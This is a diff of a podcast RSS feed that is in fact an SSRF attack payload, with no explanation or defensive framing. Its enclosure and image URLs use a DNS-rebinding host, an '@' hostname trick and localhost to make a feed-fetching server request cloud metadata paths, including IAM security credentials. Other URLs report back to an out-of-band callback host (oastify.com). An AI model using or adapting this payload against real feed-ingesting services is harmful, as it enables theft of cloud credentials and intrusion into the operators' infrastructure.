@@ -1,21 +1,19 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Apple Infrastructure Logic Test</title>
-    <link>http://qztvb1464a53enevkinatwllico3c20r.oastify.com/start</link>
-    <language>en-us</language>
+    <title>Infrastructure Integrity Check vFinal</title>
     <item>
-      <title>Rebinding Metadata Probe</title>
-      
-      <enclosure url="http://08080808.a9fea9fe.rbndr.us/latest/meta-data/iam/security-credentials/" length="2048" type="audio/mpeg"/>
-      
-      <itunes:image href="http://08080808.a9fea9fe.rbndr.us/latest/meta-data/instance-id"/>
-      
-      <content:encoded><![CDATA[
-        <img src="http://08080808.a9fea9fe.rbndr.us/latest/user-data/">
-      ]]></content:encoded>
-      
-      <description>Tracking ID: http://qztvb1464a53enevkinatwllico3c20r.oastify.com/executing</description>
+      <title>Vector 1: DNS Rebinding</title>
+      <enclosure url="http://08080808.a9fea9fe.rbndr.us:80/latest/meta-data/iam/security-credentials/" length="1" type="audio/mpeg"/>
+    </item>
+    <item>
+      <title>Vector 2: Schema Bypass</title>
+      <enclosure url="http://google.com@08080808.a9fea9fe.rbndr.us/latest/meta-data/" length="1" type="audio/mpeg"/>
+    </item>
+    <item>
+      <title>Vector 3: Localhost Map</title>
+      <enclosure url="http://localhost:80/latest/meta-data/" length="1" type="audio/mpeg"/>
+      <itunes:image href="http://qztvb1464a53enevkinatwllico3c20r.oastify.com/final_attempt_log"/>
     </item>
   </channel>
 </rss>
